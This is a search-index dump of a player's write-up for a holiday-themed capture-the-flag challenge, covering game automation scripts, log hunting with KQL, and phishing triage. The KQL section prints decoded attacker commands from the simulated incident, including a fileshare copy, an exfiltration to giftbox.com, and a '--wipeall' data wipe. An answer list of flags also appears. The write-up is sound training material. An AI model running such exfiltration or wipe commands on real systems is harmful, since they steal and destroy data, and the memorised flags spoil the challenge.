{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#introduction","title":"Introduction","text":"<p>This year's Holiday Hack has moved to warmer climates, but not all is sunshine and rainbows.</p> <p>With the assistance of the AI ChatNPT, infrastructure has been stood up, but there are concerns and so we are brougt in to evaluate. </p> <p>We check in at Orientation, collect our badge, a fishing pole and our own boat and set sail.  </p> <p>AI tools are currently all the rage. There is a lot of evidence that, when done right, AI tools are a game changer. Being able to assist in dealing with large datasets, being able to provide feedback quickly on those datasets, and helping to improve productivity.</p> <p>However, this is still a newer technology, and the ramifications and flaws are still being discovered. Whether it's bad training data, poor prompting, or data privacy concerns, there's a lot to work out.</p> <p>Let's strive to work through these challenges so we can traverse these waters well, and not get shipwrecked in this storm.</p> Navigation tip <p>Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"#answers","title":"Answers","text":"<p>1. Snowball Fight - </p> <p>See Solution.</p> <p>2. Linux 101 - </p> <p>See Solution.</p> <p>3. Reportinator - </p> <p>See Solution.</p> <p>4. Azure 101 - </p> <p>See Solution.</p> <p>5. Luggage Lock - </p> <p>See Solution.</p> <p>6. Linux PrivEsc - </p> <p>Santa</p> <p>7. Faster Lock Combination - </p> <p>See Solution.</p> <p>8. Game Cartridges: Vol 1 - </p> <p>santaconfusedgivingplanetsqrcode </p> <p>9. Game Cartridges: Vol 2 - </p> <p>GL0RY</p> <p>10. Game Cartridges: Vol 3 - </p> <p>!tom+elf!</p> <p>11. Na'an - </p> <p>See Solution.</p> <p>12. KQL Kraken Hunt - </p> <p>Beware the Cube that Wombles</p> <p>13. Phish Detection Agency - </p> <p>See Solution.</p> <p>14. Hashcat - </p> <p>IluvC4ndyC4nes!</p> <p>15. Elf Hunt - </p> <p>See Solution.</p> <p>16. Certificate SSHenanigans - </p> <p>Gingerbread Cookie Cache</p> <p>17. The Captain's Comms - </p> <p>See Solution.</p> <p>18. Active Directory - </p> <p>InstructionsForEnteringSatelliteGroundStation.txt</p> <p>19. Space Island Door Access Speaker - </p> <p>See Solution.</p> <p>20. Camera Access - </p> <p>CONQUER HOLIDAY SEASON!</p> <p>21. Missile Diversion - </p> <p>See Solution.</p> <p>Bonus! Fishing Guide- </p> <p>See Solution.</p> <p>Bonus! Fishing Mastery- </p> <p>See Solution.</p>"},{"location":"#conclusion","title":"Conclusion","text":"<p>Narrative</p> <p>Just sit right back and you\u2019ll hear a tale, A tale of a yuletide trip That started from a tropic port, Aboard this tiny ship Santa and his helpful elves To Geese Islands did go Continuing their merry work O'er sand instead of snow New this year: a shiny tool The elves logged in with glee What makes short work of many tasks? It's ChatNPT. It's ChatNPT From images to APIs This AI made elves glad But motivations were unknown So was it good or bad? Could it be that NPT Was not from off-the-shelf? Though we'll forgive and trust again We'd found a naughty elf This fancy AI tool of ours With all our work remained Not good or bad, our online friend Just did as it was trained Surely someone's taint must be Upon our AI crutch Yes indeed, this bold new world Bore Jack Frost's icy touch Though all's returned to steady state There's one thing that we know We'll all be needed once again When Santa's back on snow </p> <p></p>"},{"location":"easter_eggs/","title":"Easter Eggs","text":"<p>List all the fun and whimsical Easter Eggs you found!</p> <p> </p> <p></p> <p> </p> <p></p>"},{"location":"objectives/bonus_guide/","title":"BONUS! Fishing Guide","text":"<p>Difficulty: </p>"},{"location":"objectives/bonus_guide/#objective","title":"Objective","text":"<p>Request</p> <p>Catch twenty different species of fish that live around Geese Islands. When you're done, report your findings to Poinsettia McMittens on the Island of Misfit Toys.</p> Poinsettia McMittens <p>Excuse me, but you're interrupting my fishing serenity. Oh, you'd like to know how to become as good at fishing as I am? Well, first of all, thank you for noticing my flair for fishing. It's not just about looking good beside the lake, you know. The key is in the details, much like crafting the perfect toy. Observe the water, the weather, and the fish\u2019s habits - it's a science and an art. Of course, it helps to have a natural charm. Fish seem to find me irresistible. Must be my sparkling personality... or maybe it's just the glitter of my allure. Oh, the mysteries of the aquatic life around these islands are as elusive as, well, a clever compliment. But you'll get one if you probe enough. Remember, patience is more than a virtue in fishing; it\u2019s a strategy. Like waiting for the right time to use flattery, you wait for the right moment to strike. Go see if you can catch, say, 20 different types of fish!</p>"},{"location":"objectives/bonus_guide/#hints","title":"Hints","text":"Fishing Machine <p>There are a variety of strategies for automating repetative website tasks. Tools such as AutoKey and AutoIt allow you to programmatically examine elements on the screen and emulate user inputs.</p> I Am Become Data <p>One approach to automating web tasks entails the browser's developer console. Browsers' console allow us to manipulate objects, inspect code, and even interact with websockets.</p> Become the Fish <p>Perhaps there are some clues about the local aquatic life located in the HTML source code.</p>"},{"location":"objectives/bonus_guide/#solution","title":"Solution","text":"<p>For this challenge, I was able to catch 20 fish manually with not much trouble.</p> <p>Answer</p> <p></p>"},{"location":"objectives/bonus_guide/#response","title":"Response","text":"<p>Poinsettia McMittens</p> <p>Hoy small fry, nice work! Now, just imagine if we had an automatic fish catcher? It would be as ingenious as me on a good day! I came across this fascinating article about such a device in a magazine during one of my more glamorous fishing sessions. If only I could get my hands on it, I'd be the undisputed queen of catching them all!</p>"},{"location":"objectives/bonus_master/","title":"BONUS! Fishing Mastery","text":"<p>Difficulty:  Direct link: Objective 2 website</p>"},{"location":"objectives/bonus_master/#objective","title":"Objective","text":"<p>Request</p> <p>Catch at least one of each species of fish that live around Geese islands. When you're done, report your findings to Poinsettia McMittens.</p>"},{"location":"objectives/bonus_master/#hints","title":"Hints","text":"Fishing Machine <p>There are a variety of strategies for automating repetative website tasks. Tools such as AutoKey and AutoIt allow you to programmatically examine elements on the screen and emulate user inputs.</p> I Am Become Data <p>One approach to automating web tasks entails the browser's developer console. Browsers' console allow us to manipulate objects, inspect code, and even interact with websockets.</p> Become the Fish <p>Perhaps there are some clues about the local aquatic life located in the HTML source code.</p>"},{"location":"objectives/bonus_master/#solution","title":"Solution","text":"<p>Certainly not catching every fish at least once manually. </p> <p>I used the Developer tools to inspect the cast button and check the code handling the casting andr reeling</p> <p></p> <p><pre><code>const castReelBtn = document.querySelector('button.castreel');\ncastReelBtn.addEventListener('click', () =&gt; {\n    socket.send(`cast`);\n    window.top.postMessage({\n      type: 'sfx',\n      filename: 'fishing-cast.mp3',\n    }, '*');\n});\n\nconst reelItInBtn = document.querySelector('button.reelitin');\nreelItInBtn.addEventListener('click', () =&gt; {\n    socket.send(`reel`);\n    window.top.postMessage({\n      type: 'sfx',\n      filename: 'fishing-reel.mp3',\n    }, '*');\n});\n</code></pre> Here we see the cast and reel are web socket.send actions. I also added a break on modification of the cast button to see what was triggering the change</p> <p></p> <p><pre><code>if (me.fishing) {\n        reelItInBtn.style.display = 'block';\n        if (me.onTheLine) {\n            reelItInBtn.classList.add('gotone');\n            reelItInBtn.innerText = 'Reel it in!';\n        } else {\n            reelItInBtn.classList.remove('gotone');\n            reelItInBtn.innerText = 'Reel it in';\n        }\n</code></pre> Here we see that when something is \"onTheLine\", the classlist for the button changes, adding \"gotone\"</p> <p>In light of that, I needed to socket.send(<code>cast</code>);, watch for the classlist to change, socket.send(<code>reel</code>);, close the pescadex, and then loop until I had all of the fish.</p> <p>Looking at the HTML of the page, I do see this commented out: <pre><code>  &lt;!-- &lt;a href='fishdensityref.html'&gt;[DEV ONLY] Fish Density Reference&lt;/a&gt; --&gt;\n</code></pre> accessing https://2023.holidayhackchallenge.com/fishdensityref.html provides a heat map of all of the fish. Looking throgh, there is one fish, the Piscis Cyberneticus Skodo, that has an extremely narrow fishing ground. Overlaying that with the ocean map gives us a location to start fishing</p> <p></p> <p>With a little help from ChatGPT, we created this javascript to keep fishing until we caught them all. In Firefox, I did have to inspect the Cast button, and \"debug\" that in order to load and use the already defined names, such as \"reelItInBtn\".  I also had to tweak the timing. Without the pauses, I found that it would end up hanging and I surmised that it was running through the commands too fast, and so would end up at a point waiting for \"gotone\", but the line hadn't been cast and so I'd have to just click \"Cast\" and things would continue.</p> Auto Fish<pre><code>// Select the button you want to monitor\n// var targetButton = document.querySelector('.yourButtonClassName');\nvar targetIndex = 170 //index goes from 0-170 totaling 171 types\n\n// Function to create a MutationObserver and return a promise\nfunction observeButtonChanges() {\n  return new Promise(resolve =&gt; {\n    var observer = new MutationObserver(function(mutations) {\n      mutations.forEach(function(mutation) {\n        if (mutation.type === 'attributes' &amp;&amp; mutation.attributeName === 'class' &amp;&amp; mutation.target.classList.contains('gotone')) {\n          // Button class name changed, resolve the promise\n          resolve();\n        }\n      });\n    });\n\n    // Configure the observer to watch for attribute changes\n    var config = { attributes: 'gotone', attributeFilter: ['class'] };\n\n    // Start observing the target button with the specified configuration\n    observer.observe(reelItInBtn, config);\n  });\n}\n\n// Example usage in a do-while loop\nasync function executeWithMutationObserver() {\n  do {\n    await new Promise(resolve =&gt; setTimeout(resolve, 500));\n    // Your other logic here\n    socket.send(`cast`);\n    await new Promise(resolve =&gt; setTimeout(resolve, 500));\n    // Wait for the MutationObserver to execute\n    await observeButtonChanges();\n    await new Promise(resolve =&gt; setTimeout(resolve, 100));\n    socket.send(`reel`);\n    await new Promise(resolve =&gt; setTimeout(resolve, 1000));\n    console.log('Caught '+ playerData.fishCaught[pescadexIndex].name + ' : '+ pescadexFINdexSeeWhatIDidThere.innerText)\n    cotd.classList.remove('visible');\n    await new Promise(resolve =&gt; setTimeout(resolve, 500));\n    // Continue with the loop or additional logic\n  } while (pescadexIndex &lt;= targetIndex);\n}\n\n// Start the loop\nexecuteWithMutationObserver();\n</code></pre> <p>I let that go overnight, and by morning, we caught 170 of 171. </p> <p>To find the one we haven't caught yet, I used the following</p> <p><pre><code>// I ran this against the fishdensityref.html page to just get all of the names and put them in an array\nvar devfish = Array.from(document.getElementsByTagName('h3')).map(function(element) {\n  return element.innerText;\n}); \n// this I just referenced the pescadex\nvar fishcaughtlist = playerData.fishCaught.map(function(obj) {\n  return obj.name;\n});\n// and compared the two arrays\nvar tobecaught = devfish.filter(function(element) {\n  return fishcaughtlist.indexOf(element) === -1;\n});\n\ntobecaught\nArray [ \"Gumball Glooperfish\" ]\n</code></pre> Looking for the Gumball Glooperfish, I did the same thing to find the previous fishing spot. I overlayed Gumball's heat map over the island map:</p> <p></p> <p>Picked a new fishing spot, and cast the line again, and let the loop go until I caught the Gumball.</p> <p>Answer</p>"},{"location":"objectives/bonus_master/#response","title":"Response","text":"<p>Poinsettia McMittens</p> <p>You managed to catch every fish? You're like the fishing version of a Christmas miracle! Now, if only you could teach me your ways... but then again, I'm already pretty fabulous at everything I do.</p>"},{"location":"objectives/o10_gc3/","title":"Game Cartridges: Vol 3","text":"<p>Difficulty:  Direct link: GameBoy3</p>"},{"location":"objectives/o10_gc3/#objective","title":"Objective","text":"<p>Request</p> <p>Find the third Gamegosling cartridge and beat the game</p> Angel Candysalt <p>The name's Angel Candysalt, the great treasure hunter! A euphemism? No, why do people always ask me that?? Anyways, I came here to nab the treasure hidden in this ship graveyard, only to discover it's protected by this rusted maze. That must be why all these old ships are here. Their crew came to find the treasure, only to get lost in the labrynth.  There are 3 buried treasures in total, each in its own uncharted area around Geese Islands. I've been getting lost in this maze for hours now with no luck, and my feet are starting to get sore. Maybe you'll be able to find the way through. Here, use my Gameboy Cartridge Detector. Go into your items and test it to make sure it's still working. When you get close to the treasure, it'll start sounding off. The closer you get, the louder the sound. No need to activate or fiddle with it. It just works! At least it's obvious where this one is. See that shiny spot over to the right? That's gotta be where it is! If only I had a bird's eye view. But how to get there? Up? Down? Left? Right? Oh well, that's your problem now! Come back if you can find your way to it, and I'll tell you some secrets I've heard about this one.</p>"},{"location":"objectives/o10_gc3/#hints","title":"Hints","text":"Gameboy 3 <p>1) This one is a bit long, it never hurts to save your progress! 2) 8bit systems have much smaller registers than you\u2019re used to. 3) Isn\u2019t this great?!? The coins are OVERFLOWing in their abundance.</p> Bird's Eye View <p>The location of the treasure in Rusty Quay is marked by a shiny spot on the ground. To help with navigating the maze, try zooming out and changing the camera angle.</p>"},{"location":"objectives/o10_gc3/#solution","title":"Solution","text":"<p>Going to Steampunk Island, Rusty Quay port, We can see where the Rom is, but how to get there</p> <p></p> <p>We can try to find a position and zoom our browser out to get the whole picture, or we can go to the developer tools, and inspect the page:</p> <p><pre><code>&lt;div class=\"floor\" alt=\"\" style=\"width: 7400px; height: 8800px; transform: translate3d(0px, 0px, 0px) rotateX(90deg); background: url(&amp;quot;images/fabric/spi-rustyquay_floor.png&amp;quot;) no-repeat;\"&gt;&lt;/div&gt;\n</code></pre> We download spi-rustyquay_floor.png and look at that and trace our path:</p> <p></p> <p>Now that we have the rom for Vol3, we load that up and check it out</p> <p> PREVIOUSLY ON...Elf: GLOOOOOR....T-wiz: Just a second Elf. As Vol3 seems pretty buggy and coins seem to disappear after you save. You should know that my magic is available.Elf: Oh! cough Thanks for letting me know! GLOOOOOOOOOOORY!</p> <p>Looks like we've moved to Super Mario Bros, and collecting coins. We appear to have 5 screens of coins with some turnip goomba's, which send us back to the start. Screen 2-4 have coin valuses of ones, tens, and hundreds. Screen 1 and 5 have all values. If we collect more than 990, but less than 999, and the next coin reach 999 or more, then the total just goes over and we start back at 0. but if we go to 989 and collect a 10 coin, or 899 and collect a 100 coin, then we get an error</p> <p></p> <p>On Screen 5 we run into Jared who gives us an indication that we need 9's</p> <p></p> Jared: Back in my SysAdmin days marketing always loved talking about [5] nines. But we all know it was more like [3] nines. <p>And at the end of screen 5, we come to a ledge and if we have different coin values we see something different</p> <p>  &lt;------------------------------------ When we have less than x99 we see nothing but a ledge But if we have x99 coins, we see a ledge we can jump to ------------------------------------&gt;</p> <p>We jump over to the other side and find another room:</p> <p>  Elf: If by \"never\" you mean I've filled my treasure pouch to the brim with coins, then yes, I agree! I have \"never\" found this many crypto coins! GLOOOOOOOOOOORY! Elf shows Liston all his coins  Liston: How in the world did you... never mind. Say this passphrase \"morethanmeetstheeye\" to the ChatNPT thinger and then give it all your coins!</p> <p>Answer</p> <p></p>"},{"location":"objectives/o10_gc3/#response","title":"Response","text":"<p>Angel Candysalt</p> <p>The life of a treasure hunter isn't easy, but it sure is exciting! Oh it's a video game, I love video games! But you've claimed this treasure, nicely done. Now, about those secrets I've been told. They're pretty cryptic, but they are. Hopefully that helps with something!  You have all three? Wow, you must be the greatest treasure hunter that ever lived!</p>"},{"location":"objectives/o11_fn_nan/","title":"Na'an","text":"<p>Difficulty:  Direct link: Na'an</p>"},{"location":"objectives/o11_fn_nan/#objective","title":"Objective","text":"<p>Request</p> <p>Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling elf and win!</p> Shifty McShuffles <p>Hey there, stranger! Fancy a game of cards? Luck's on your side today, I can feel it. Step right up, test your wit! These cards could be your ticket to fortune. Trust me, I've got a good eye for winners, and you've got the look of luck about you. Plus, I'd wager you've never played this game before, as this isn't any ordinary deck of cards. It's made with Python. The name of the game is to bamboozle the dealer. So whad'ya think? Are you clever enough?</p>"},{"location":"objectives/o11_fn_nan/#hints","title":"Hints","text":"The Upper Hand <p>Shifty said his deck of cards is made with Python. Surely there's a weakness to give you the upper hand in his game.</p> Stump the Chump <p>Try to outsmart Shifty by sending him an error he may not understand.</p>"},{"location":"objectives/o11_fn_nan/#solution","title":"Solution","text":"<p>Python has issues with strings that are \"Not a Number\". So unless you are performing checks and validation to address circumstances that result in NaN, then actors could use this to their advantage. As Shifty is checking numbers, lookin for high and low card and giving points accordingly, let's see if we can set one of the cards to \"NaN\"</p> <p></p> <p>I'm certain that Shifty does not want this to happen. He'll need to add some checks. We'll repeat this until:</p> <p>Answer</p> <p></p>"},{"location":"objectives/o11_fn_nan/#response","title":"Response","text":"<p>Shifty McShuffles</p> <p>Well, you sure are more clever than most of the tourists that show up here. I couldn't swindle ya, but don't go telling everyone how you beat me! An elf's gotta put food on the table somehow, and I'm doing the best I can with what I got.</p>"},{"location":"objectives/o12_fn_kql/","title":"KQL Kraken Hunt","text":"<p>Difficulty:  Direct link: Kusto</p>"},{"location":"objectives/o12_fn_kql/#objective","title":"Objective","text":"<p>Request</p> <p>Use Azure Data Explorer to uncover misdeeds in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information.</p> Tangle Coalbox <p>Greetings, rookie. Tangle Coalbox of Kusto Detective Agency here. I've got a network infection case on Film Noir Island that needs your expertise. Seems like someone clicked a phishing link within a client's organization, and trouble's brewing. I'm swamped with cases, so I need an extra pair of hands. You up for the challenge? You'll be utilizing the Azure Data Explorer and those KQL skills of yours to investigate this incident. Before you start, you'll need to create a free cluster. Keep your eyes peeled for suspicious activity, IP addresses, and patterns that'll help us crack this case wide open. Remember, kid, time is of the essence. The sooner we can resolve this issue, the better. If you run into any problems, just give me a holler, I've got your back. Good hunting, and let's bring this cyber criminal to justice. Once you've got the intel we need, report back and we'll plan our next move. Stay sharp, rookie.</p>"},{"location":"objectives/o12_fn_kql/#hints","title":"Hints","text":"File Creation <p>Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table.</p> KQL Tutorial <p>Once you get into the Kusto trainer, click the blue Train me for the case button to get familiar with KQL.</p> Outbound Connections <p>Do you need to find something that happened via a process? Pay attention to the ProcessEvents table!</p>"},{"location":"objectives/o12_fn_kql/#solution","title":"Solution","text":"<p>We are provided nine datasets to ingest into Azure Data Explorer</p> <ul> <li>AuthenticationEvents</li> <li>Email</li> <li>Employees</li> <li>FileCreationEvents</li> <li>InboundNetworkEvents</li> <li>OutboundNetworkEvents</li> <li>PassiveDns</li> <li>ProcessEvents</li> <li>SecurityAlerts</li> </ul> <p>We then work to familiarize ourselves with the Kusto Query Language, watch videos, do a little practice and dive into analyzing the Geese Islands' network.</p>"},{"location":"objectives/o12_fn_kql/#onboarding","title":"Onboarding","text":"<p>Question</p> <p>How many Craftperson Elf's are working from laptops? </p> <p>take is a great way to check out a dataset. <pre><code>Employees\n| take 10\n</code></pre></p> <p></p> <p>Here we want to focus on role and hostname</p> <pre><code>Employees  \n| where role == \"Craftsperson Elf\" \n| where hostname has \u201claptop\u201d \n| count\n</code></pre> <p>Answer</p> <p>25 </p>"},{"location":"objectives/o12_fn_kql/#case-1","title":"Case 1","text":"<p>Quote</p> <p>An urgent alert has just come in, 'A user clicked through to a potentially malicious URL involving one user.' This message hints at a possible security incident, leaving us with critical questions about the user's intentions, the nature of the threat, and the potential risks to Santa's operations. Your mission is to lead our security operations team, investigate the incident, uncover the motives behind email, assess the potential threats, and safeguard the operations from the looming cyber threat. The clock is ticking, and the stakes are high - are you up for this exhilarating challenge? Your skills will be put to the test, and the future of Geese Island's digital security hangs in the balance. Good luck!The alert says the user clicked the malicious link 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'</p> <p>Question</p> <p>What is the email address of the employee who received this phishing email? </p> <p>We look at the Email table using take again, and see we have a link column</p> <pre><code>Email  \n| where link == \"http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx\" \n</code></pre> <p></p> <p>Answer</p> <p>alabaster_snowball@santaworkshopgeeseislands.org </p> <p>Question</p> <p>What is the email address that was used to send this spear phishing email? </p> <p>Answer</p> <p>cwombley@gmail.com </p> <p>Question</p> <p>What was the subject line used in the spear phishing email? </p> <p>Answer</p> <p>[EXTERNAL] Invoice foir reindeer food past due </p>"},{"location":"objectives/o12_fn_kql/#case-2","title":"Case 2","text":"<p>Quote</p> <p>Nicely done! You found evidence of the spear phishing email targeting someone in our organization. Now, we need to learn more about who the victim is!If the victim is someone important, our organization could be doomed! Hurry up, let's find out more about who was impacted!</p> <p>Question</p> <p>What is the role of our victim in the organization? </p> <p>We go back to Employees and look for who has the email alabaster_snowball@santaworkshopgeeseislands.org</p> <pre><code>Employees\n| where email_addr== \"alabaster_snowball@santaworkshopgeeseislands.org\"\n</code></pre> <p></p> <p>Answer</p> <p>Head Elf </p> <p>Question</p> <p>What is the hostname of the victim's machine? </p> <p>Answer</p> <p>Y1US-DESKTOP </p> <p>Question</p> <p>What is the source IP linked to the victim? </p> <p>Answer</p> <p>10.10.0.4 </p>"},{"location":"objectives/o12_fn_kql/#case-3","title":"Case 3","text":"<p>Quote</p> <p>The victim is Alabaster Snowball? Oh no... that's not good at all! Can you try to find what else the attackers might have done after they sent Alabaster the phishing email?Use our various security log datasources to uncover more details about what happened to Alabaster.</p> <p>Question</p> <p>What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs! </p> <p>When Alabaster click's the link, it creates an outbound network connection, so we pivot over to the OutboundNetworkEvents table, use take to check what data exist, and check url for the link in the email</p> <pre><code>OutboundNetworkEvents  \n| where url == \"http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx\"\n</code></pre> <p></p> <p>Answer</p> <p>2023-12-02T10:12:42Z </p> <p>Question</p> <p>What file is dropped to Alabaster's machine shortly after he downloads the malicious file? </p> <p>This one we need to move over to the FileCreationEvents table. Using take again, we need to pivot using the hostname we saw listed for Alabaster earlier</p> <pre><code>FileCreationEvents \n| where hostname == \"Y1US-DESKTOP\"\n| where timestamp &gt;= datetime(2023-12-02T10:12:42Z)\n</code></pre> <p></p> <p>Answer</p> <p>C:\\ProgramData\\Windows\\Jolly\\giftwrap.exe </p>"},{"location":"objectives/o12_fn_kql/#case-4","title":"Case 4","text":"<p>Quote</p> <p>Well, that's not good. It looks like Alabaster clicked on the link and downloaded a suspicious file. I don't know exactly what giftwrap.exe does, but it seems bad.Can you take a closer look at endpoint data from Alabaster's machine? We need to figure out exactly what happened here. Word of this hack is starting to spread to the other elves, so work quickly and quietly!</p> <p>Question</p> <p>The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?</p> <p>We take a look through the tables, searching for Alabaster's system, and in ProcessEvents we find something interesting</p> <pre><code>ProcessEvents \n| where hostname == \"Y1US-DESKTOP\"\n| where timestamp &gt;= datetime(2023-12-02T10:12:42Z)\n</code></pre> <p></p> <p>Answer</p> <p>113.37.9.17 </p> <p>Question</p> <p>What is the timestamp when the attackers enumerated network shares on the machine? </p> <p>You would use the net command to enumerate shares:</p> <pre><code>ProcessEvents \n| where hostname == \"Y1US-DESKTOP\"\n| where timestamp &gt;= datetime(2023-12-02T10:12:42Z)\n| where process_commandline contains \"net\"\n</code></pre> <p></p> <p>Answer</p> <p>2023-12-02T16:51:44Z </p> <p>Question</p> <p>What was the hostname of the system the attacker moved laterally to? </p> <p></p> <p>Answer</p> <p>NorthPolefileshare </p>"},{"location":"objectives/o12_fn_kql/#case-5","title":"Case 5","text":"<p>Quote</p> <p>Wow, you're unstoppable! Great work finding the malicious activity on Alabaster's machine. I've been looking a bit myself and... I'm stuck. The messages seem to be garbled. Do you think you can try to decode them and find out what's happening?Look around for encoded commands. Use your skills to decode them and find the true meaning of the attacker's intent! Some of these might be extra tricky and require extra steps to fully decode! Good luck!  If you need some extra help with base64 encoding and decoding, click on the 'Train me for this case' button at the top-right of your screen.</p> <p>Question</p> <p>When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?</p> <p>We look at the ProcessEvents table, filtering on the powershell.exe process.</p> <pre><code>ProcessEvents \n| where hostname == \"Y1US-DESKTOP\"\n| where timestamp &gt;= datetime(2023-12-02T10:12:42Z)\n| where process_name == \"powershell.exe\"\n</code></pre> <p></p> <p>We focus on the process whose parent process is cmd.exe as that is what has been used to run all of the attacker commands.</p> <p>Answer</p> <p>2023-12-24T16:07:47Z</p> <p>Question</p> <p>What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)</p> <p>We take the base64 block of the powershell command identified, decode it, and also pass it to reverse() in light of it being in reverse oder.</p> <pre><code>print str = base64_decode_tostring(\"KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn\")\n| extend rstr = reverse(str)\n</code></pre> <p></p> <p>Answer</p> <p>NaughtyNiceList.txt</p> <p>Question</p> <p>The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?</p> <p>We shift our query to look for where process_commandline contains \"powershell.exe\"</p> <p></p> <p></p> <p>I haven't been able to figure out how to convert this within Azure Data Explorer using KQL, but it's really easy to do in powershell</p> <pre><code>     PS /&gt; [StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))\n     downwithsanta.exe -exfil C:\\\\Desktop\\\\NaughtNiceList.docx \\\\giftbox.com\\file\n</code></pre> <p>Answer</p> <p>giftbox.com </p>"},{"location":"objectives/o12_fn_kql/#case-6","title":"Case 6","text":"<p>Quote</p> <p>Wow! You decoded those secret messages with easy! You're a rockstar. It seems like we're getting near the end of this investigation, but we need your help with one more thing...We know that the attackers stole Santa's naughty or nice list. What else happened? Can you find the final malicious command the attacker ran?</p> <p>Question</p> <p>What is the name of the executable the attackers used in the final malicious command?</p> <p>There is one more powershell command we see in the previous search</p> <p></p> <p>Using the same process to decode base64 gives us</p> <pre><code>C:\\Windows\\System32\\downwithsanta.exe --wipeall \\\\\\\\NorthPolefileshare\\\\c$\n</code></pre> <p>Answer</p> <p>downwithsanta.exe</p> <p>Question</p> <p>What was the command line flag used alongside this executable?</p> <p>Answer</p> <p>--wipeall</p>"},{"location":"objectives/o12_fn_kql/#well-done","title":"Well Done!","text":"<p>Quote</p> <p>Congratulations, you've cracked the Kusto detective agency section of the Holiday Hack Challenge! By now, you've likely pieced together the broader narrative of the alert we received. It all started with Wombley Cube, a skilled Craftsperson, and a malicious insider, who sent an email to the esteemed head elf, Alabaster Snowball. This seemingly innocent email contained a dangerous link leading to the malicious domain, MadElvesNorthPole.org. Alabaster Snowball, from his PC, unwittingly clicked on the link, resulting in the download and execution of malicious payloads. Notably, you've also discerned Wombley Cube's ulterior motive: to pilfer a copy of Santa's naughty or nice list and erase the data on the share drive containing critical information to Santa's operations. Kudos to you!To earn credit for your fantastic work, return to the Holiday Hack Challenge and enter the secret phrase which is the result of running this query:</p> <pre><code>print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')\n</code></pre> <p>Answer</p> <p>Beware the Cube that Wombles </p>"},{"location":"objectives/o12_fn_kql/#response","title":"Response","text":"<p>Tangle Coalbox</p> <p>I had my doubts, but you've proven your worth. That phishing scheme won't trouble our client's organization anymore, thanks to your keen eye and investigatory prowess. So long, Gumshoe, and be careful out there.</p>"},{"location":"objectives/o13_fn_phish/","title":"Phish Detection Agency","text":"<p>Difficulty:  Direct link: Phish Detection</p>"},{"location":"objectives/o13_fn_phish/#objective","title":"Objective","text":"<p>Request</p> <p>Fitzy Shortstack on Film Noir Island needs help battling dastardly phishers. Help sort the good from the bad!</p> Fitzy Shortstack <p>Just my luck, I thought... A cybersecurity incident right in the middle of this stakeout. Seems we have a flood of unusual emails coming in through ChatNPT. Got a nagging suspicion it isn't catching all the fishy ones. You're our phishing specialist right? Could use your expertise in looking through the output of ChatNPT. Not suggesting a full-blown forensic analysis, just mark the ones screaming digital fraud. We're looking at all this raw data, but sometimes, it takes a keen human eye to separate the chaff, doesn't it? I need to get more powdered sugar for my donuts, so do ping me when you have something concrete on this.</p>"},{"location":"objectives/o13_fn_phish/#hints","title":"Hints","text":"DMARC, DKIM, and SPF, oh my! <p>Discover the essentials of email security with DMARC, DKIM, and SPF at Cloudflare's Guide.</p>"},{"location":"objectives/o13_fn_phish/#solution","title":"Solution","text":"<p>DMARC, DKIM, and SPF work together to determine if an email is truly from the recipient.</p> <p>DKIM provided the ability to sign a message where a recipient email can verify it's authenticity</p> <p>SPF will inform recipient domains what email servers are intended to be used to send emails on behalf of the sender's domain.</p> <p>DMARC tells the recipient domain what to do if a DKIM or SPF check fails.</p> <p>Here is an example email that was marked as phishing incorrectly:</p> <p>Example Incorrect Phishing Designation</p> <p> &lt;-- Sender shows as geeseislands &lt;-- Matches Return Path and Received From &lt;-- DKIM Signature Passes &lt;-- DMARC Passes</p> <p>Where this is an example of missing an email that should be marked as phishing</p> <p>Example Missed Phishing Designation</p> <p> &lt;-- Sender shows as geeseislands &lt;-- Does NOT match Return Path and Received From &lt;-- DKIM Signature does NOT pass &lt;-- DMARC Fails</p> <p>Emails that are from our domain, and appear to originate from our domain, but are not signed by our email server are also not legitimate and should be considered phishing </p> <p>Example DKIM Failure</p> <p> &lt;-- Sender shows as geeseislands &lt;-- Does match Return Path and Received From &lt;-- Missing DKIM Signature indicates did not come from geeseislands server &lt;-- DMARC Fails</p> <p>So those are some examples of what we are looking for. After review of all emails, the following were incorrectly marked and now show the corrected state</p> <p>So we look through the emails and make sure that those emails that failed are marked as spam, and those that did not fail are marked as safe. Checking the senders, reply to, received from, DKIM, and DMARC checks to validate.</p> From Subject Corrected State laura.moore@geeseislands.com Coral Reef Study Findings Safe quentin.adams@geeseislands.com Quality Assurance Protocols Meeting Safe xavier.jones@geeseislands.com Urgent IT Security Update Phishing john.doe@geeseislands.com Pacific Festive Celebrations Overview Safe uma.foster@geeseislands.com Operational Efficiency Review Safe rachel.brown@geeseislands.com Customer Feedback Analysis Meeting Phishing 